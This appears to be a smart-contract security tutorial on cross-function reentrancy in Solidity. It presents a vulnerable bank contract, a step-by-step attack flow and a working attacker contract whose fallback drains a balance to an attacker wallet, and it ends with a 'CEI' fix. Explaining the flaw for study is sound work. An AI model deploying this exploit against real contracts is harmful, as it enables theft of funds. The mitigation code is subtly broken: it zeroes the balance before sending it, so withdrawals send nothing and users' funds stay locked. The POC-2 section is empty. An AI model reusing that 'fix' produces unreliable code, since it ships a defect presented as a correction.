# Cross-Function Reentrancy

<hr>

`Cross-function reentrancy` can occur when two or more functions in a program share the same state variable and one or more of these functions update the variable in an insecure manner. This creates a situation where one function can be called multiple times by another function before the state changes are propagated through the program, causing unexpected behavior.

## Vulnerable Contract

<hr>

```sol
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

abstract contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract VulnerableContract is ReentrancyGuard {
    mapping (address => uint) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function transfer(address _to, uint _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        balances[_to] += _amount;
        balances[msg.sender] -= _amount;
    }

    function withdraw() external noReentrant {  
        require(balances[msg.sender] > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer Failed");

        balances[msg.sender] = 0;
    }

    function getUserBalance(address _user) public view returns (uint256) {
        return balances[_user];
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

### Understanding the Contract

**1. VulnerableContract:** Allows users to deposit, transfer and withdraw funds. It inherits from an ReentrancyGuard contract that implements a locking mechanism to prevent reentrancy attacks.

**2. ReentrancyGuard contract:** It uses a boolean flag called locked to ensure that no function can be re-entered while it is still executing. The noReentrant modifier defined in the ReentrancyGuard contract checks that the locked flag is false before executing the function and sets it to true. After the function has executed, it sets the locked flag back to false.

**3. deposit function:** Allows users to add funds to their account by sending Ether to the contract.

**4. transfer function:** Allows users to transfer funds from their account to another account.
  
**5. withdraw function:** It uses the call function to transfer funds to the user's address and checks whether the transfer was successful before updating the user's balance. If the transfer fails, the user's balance remains in the contract.

**6. balances:** A private mapping that maps user addresses to their account balance.

**7. getUserBalance function:** Allows users to query their current account balance.

**8. getBalance function:** Returns the current balance of the contract.

### Identifying the vulnerability


<center><img class="image" src="./assets/images/cause-cross-function-re-entrancy.jpg"></center>
<b><center class="img-label">Vulnerability</center></b>

The withdraw() function in the above code facilitates the transfer of the entire balance of the caller to their external account using the call() function. If the caller is a contract, it is important to note that the fallback function of that contract will be called whenever it receives a message. This means that if funds are transferred to the contract, there is a potential for a malicious contract to trigger its fallback function and run arbitrary code within the context of the withdraw() function. This could give the attacker an opportunity to exploit.

In our case, if the fallback function of the malicious contract calls the transfer() function of the victim contract simultaneously, it could potentially transfer the funds out of the victim's account before setting the balance to zero in the balances state variable. To understand this, check out the flow of execution below (Step-by-step explanation of how a cross function reentrancy attack could be carried out in this Vulnerable Contract.)

<center><img class="image" src="./assets/images/cross-function-re-entrancy.jpg"></center>
<b><center class="img-label">Flow of execution</center></b>

The attacker deposits some money into the vulnerable contract using their own malicious contract, with the intention of creating a balance and withdrawing it in order to exploit a vulnerability in the code. After that, they call the withdraw() function of the victim contract. The flow of execution is as follows:

**1. Calling the victim contract's withdraw() function:** The attacker's contract sends a request to the victim contract to execute the withdraw() function.

**2. Transferring funds to the caller:** The victim contract begins executing the withdraw() function and checks if the caller has a positive balance. If so, it transfers the funds through the call() function to the sender (attacker's contract). However, the attacker's malicious contract triggers the fallback function when it receives the funds, and the fallback function calls the transfer() function of the victim contract while the execution of the withdraw() function is still in progress. (Note that the victim contract have not updated the caller's balance to zero because the line of code `balances[msg.sender] = 0;` that updates the sender's balance is still pending to execute.)

**3. Updating the state variable:** Updating the state variable: The attacker's contract needs to provide parameters, such as the amount to transfer and the destination address, to call the transfer() function. The amount can be less than or equal to the balance of the attacker's contract, and the destination address can be the attacker's wallet address.

**4. Reducing the amount from the caller address:** The victim contract deducts the amount from the attacker's contract address.

**5. Increasing the amount to the wallet address:** The victim contract adds the amount to the attacker's wallet address.


**6. Updating the caller balance:** Eventually, the execution state returns to the withdraw() function, and the attacker's contract's balance is set to zero.

**7. Checking wallet address balance:** Finally, the attacker can check their wallet balance in the victim contract and withdraw additional funds using the withdraw() function.

## POC-1, Attacker Contract

<hr>

```sol
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

interface IVulnerableContract {
    function deposit() external payable;
    function transfer(address _to, uint _amount) external;
    function withdraw() external;
    function getUserBalance(address _user) external view returns (uint);
} 

contract AttackerContract {
    IVulnerableContract public immutable vulnerableContract;
    address public walletAddress = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;

    constructor(IVulnerableContract _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
    }

    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.transfer(
                walletAddress, 
                vulnerableContract.getUserBalance(address(this))
            );
        }
    }

    function initiateAttack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw();
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
```

### Understanding the Contract

**1. IVulnerableContract interface:** An interface that defines the functions of the vulnerable contract that the attacker contract will interact with.

**2. walletAddress:** An address that represents the attacker's wallet.

**3. constructor function:** Initializes the vulnerableContract variable with the address of the vulnerable contract.

**4. fallback function:** A function that executes when the contract receives a transaction that does not match any of its functions. It checks if the balance of the vulnerableContract is greater than or equal to 1 ether and calls the transfer function to transfer the attacker's funds to the walletAddress.

**5. initiateAttack function:** A function that requires the attacker to send 1 Ether to the contract before depositing and withdrawing funds from the vulnerable contract. After that, it immediately calls the withdraw function.

**6. getBalance function:** Returns the current balance of the AttackerContract.

## POC-2, Attacker Contract

This POC is updated version of POC-1.
<!-- <center><img class="image" src="./assets/images/cross function re-entrancy.jpg"></center>
<b><center class="img-label">Output</center></b> -->

## mitigatation:

The CEI pattern is a design pattern aimed at ensuring the safety of smart contracts by categorizing operations into three types: 

**1. Checks:** Checks are used to verify that certain conditions are met before executing a function such as checking that the user has the required balance or that the contract is in the correct state before executing the function.

**2. Effects:** Effects are used to make changes to the state of the contract such as updating balances, transferring tokens, updating storage variables. 

**3. Interactions:** Interactions are used to call external contracts or functions such as sending tokens to another contract or calling a function on an external contract.

The pattern ensures that all the necessary checks are performed before any state changes are made, reducing the chances of unexpected behavior or unintended consequences.

Here's an example of updated vulnerable contract:

```sol
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

abstract contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract VulnerableContract is ReentrancyGuard {
    mapping (address => uint) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function transfer(address _to, uint _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
    }

    function withdraw() external noReentrant {  
        // Check
        require(balances[msg.sender] > 0, "Insufficient balance");
        // Effect
        balances[msg.sender] = 0;
        // Interaction
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer Failed");
    }

    function getUserBalance(address _user) public view returns (uint256) {
        return balances[_user];
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

